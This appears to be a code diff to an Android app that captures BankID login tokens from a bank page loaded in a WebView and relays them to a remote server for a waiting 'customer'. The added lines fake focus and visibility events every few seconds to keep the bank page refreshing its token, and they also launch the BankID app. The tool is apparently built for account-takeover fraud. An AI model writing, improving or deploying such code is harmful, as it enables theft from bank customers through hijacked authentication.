@@ -32,12 +32,39 @@ class MainActivity : AppCompatActivity() {
             web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
         } catch (e: Exception) {
         }
+        status.setOnLongClickListener {
+            prefs().edit().remove("session").apply()
+            newSession()
+            true
+        }
         web.webViewClient = object : WebViewClient() {
             override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
                 if (r.url.scheme == "bankid") { grab(r.url); return true }
                 return false
             }
         }
+
+        // ge bankens sida en akta osynlig -> synlig, plus fokus och pageshow
+        web.postDelayed(object : Runnable {
+            override fun run() {
+                try {
+                    web.onPause()
+                    web.postDelayed({
+                        try {
+                            web.onResume()
+                            web.evaluateJavascript(
+                                "window.dispatchEvent(new Event('focus'));" +
+                                "document.dispatchEvent(new Event('visibilitychange'));" +
+                                "window.dispatchEvent(new Event('pageshow'));", null)
+                        } catch (e: Exception) {
+                        }
+                    }, 200)
+                } catch (e: Exception) {
+                }
+                web.postDelayed(this, 2500)
+            }
+        }, 4000)
+
         findViewById<EditText>(R.id.server).setText(Api.base)
         findViewById<Button>(R.id.save).setOnClickListener {
             val s = findViewById<EditText>(R.id.server).text.toString().trim()
@@ -57,19 +84,16 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun newSession() {
-        Api.newSession { code ->
+        val code = prefs().getString("session", null) ?: Api.newCode()
+        session = code
+        prefs().edit().putString("session", code).apply()
+        status.text = "Kundkod: $code"
+        RelaySocket.connect(code) { txt ->
             runOnUiThread {
-                session = code
-                prefs().edit().putString("session", code).apply()
-                RelaySocket.connect(code) { txt ->
-                    runOnUiThread {
-                        when (JSONObject(txt).optString("type")) {
-                            "token"   -> status.text = "Token skickad — väntar på kund"
-                            "expired" -> status.text = "Token dog — ladda om banken"
-                        }
-                    }
+                when (JSONObject(txt).optString("type")) {
+                    "token"   -> status.text = "Token skickad — väntar på kund"
+                    "expired" -> status.text = "Token dog — ladda om banken"
                 }
-                status.text = "Kundkod: $code"
             }
         }
     }
@@ -83,6 +107,8 @@ class MainActivity : AppCompatActivity() {
             Api.postToken(session, t)
             status.text = "Token skickad"
         }
+        // oppna BankID sa att bankens sida faktiskt blir osynlig och synlig igen
+        startActivity(Intent(Intent.ACTION_VIEW, u).setPackage("com.bankid.bus"))
     }
 
     private fun share() {
